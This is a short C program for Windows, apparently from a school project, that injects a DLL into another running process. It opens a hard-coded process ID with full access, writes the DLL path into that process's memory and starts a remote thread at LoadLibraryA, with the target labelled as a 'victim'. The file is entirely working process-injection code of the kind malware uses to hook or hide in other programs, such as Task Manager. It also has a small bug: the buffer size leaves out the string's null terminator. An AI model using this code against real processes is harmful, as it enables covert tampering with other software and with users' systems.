#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>
#include <memoryapi.h>

int main() {
    int process_id = 25116;
	DWORD PID = (DWORD)process_id;
	char* dll_name = "F:/codingHm/school/taskMangerDLL/Debug/taskMangerDLL.dll";
	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0,PID);
	LPVOID victim_address = VirtualAllocEx(process_handle, NULL, strlen(dll_name), 0x3000, PAGE_READWRITE);
	DWORD last_error = GetLastError();
	WriteProcessMemory(process_handle, victim_address,dll_name,strlen(dll_name), NULL);
	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)addr;
	CreateRemoteThread(process_handle, NULL,0, lpStartAddress, victim_address,NULL,NULL);
	return 0;
}

